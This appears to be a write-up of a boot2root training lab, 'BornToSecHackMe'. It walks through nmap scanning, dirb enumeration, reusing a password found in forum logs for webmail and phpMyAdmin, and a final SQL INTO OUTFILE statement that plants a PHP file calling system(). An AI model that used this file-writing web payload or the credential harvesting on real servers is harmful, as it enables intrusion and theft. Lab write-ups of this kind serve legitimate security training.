# IP address:
After running the machine, we found that there is no apparent IP address we can use to somehow 
access the machine.

As a first attempt we used the command `nmap -sn [HOST_IP]/16` to do a ping scan on the subnet 
while the machine is attached to the bridge adapter, but we were faced with the sheer amount of 
IP addresses of the cluster. So we used virtualbox's Host Network Manager to create an interface
with a specific IP address, then run the same command but this time with netmask of 24.

The IP address we find using nmap give us a webpage but no more informations it apart from fome
links to social media websites.



# Enumeration:
We used `dirb https://[IP_ADDRESS]` to enumerate all probable links in the server. Among the 
found results, we spot the link ending with `.../templates_c` wiche contains some .php files.
The idea is to try and put a .php file that we can run manually.
There is also some links like `.../forum`, `.../webmail` and .../phpmyadmin.
The link `.../forum` has a page with some logs in it, and crolling through 
we see a successful login attemp with the user `lmezard`, but before it there's a line with
characters that resembles a password. 

```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; lo...
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com....
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
Oct 5 10:51:01 BornToSecHackMe CRON[13049]: pam_unix(cron:session): session closed for user root
Oct 5 10:52:01 BornToSecHackMe CRON[13092]: pam_unix(cron:session): session opened for user root by (uid=0)
```



# Webmail:
Using `lmezard` and `!q\]Ej?*5K5cy*AJ` as username and password on the login page we access 
the user `lmezard`, and checking the profile page we find the email address `laurie@borntosec.net`.
Now if we try using that email address with the password we found we have access the home page
of the webmail service where we can see an email with some pretty viral informations, the username 
and password for phpmyadmin:
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
Let's use these credientials to login info phpmyadmin, and there we find all the tables of the database.



# PhpMyAdmin:
So far, we have no direct access to the machine.
We can now write some SQL commands to retrieve content of files from 
```
SELECT '<?php system("cat /home/LOOKATME/password > /var/www/forum/templates_c/password.txt"); ?>'
INTO OUTFILE '/var/www/forum/templates_c/get_password.php'
```
